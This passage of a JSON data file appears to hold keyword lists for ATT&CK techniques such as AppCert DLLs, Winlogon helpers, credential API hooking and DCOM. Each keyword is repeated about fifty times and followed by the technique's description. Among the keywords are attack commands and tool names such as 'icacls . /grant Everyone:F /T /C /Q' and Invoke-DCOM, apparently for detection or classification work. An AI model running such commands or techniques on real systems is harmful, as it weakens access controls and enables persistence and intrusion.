    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "msiexec, odbcconf",
    "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)"
  ],
  "event triggered execution: appcert dlls": [
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    " AppCertDLL",
    "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. "
  ],
  "boot or logon autostart execution: winlogon helper dll": [
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "winlogon",
    "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence."
  ],
  "file and directory permissions modification": [
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    "chmod ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " attrib +h ",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    " icacls . /grant Everyone:F /T /C /Q",
    "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) "
  ],
  "input capture: credential api hooking": [
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "API hooking ",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "SetWindowsHookEx",
    "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n"
  ],
  "pre-os boot: system firmware": [
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "UEFI BIOS ",
    "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect."
  ],
  "boot or logon autostart execution: lsass driver": [
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "lsass.exe ",
    "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads."
  ],
  "remote services: distributed component object model": [
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    "COM and execution in same sentence ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " Invoke-DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " DCOM ",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    " COM execution",
    "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)"
  ],
  "system binary proxy execution: cmstp": [
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
    "cmstp.exe",
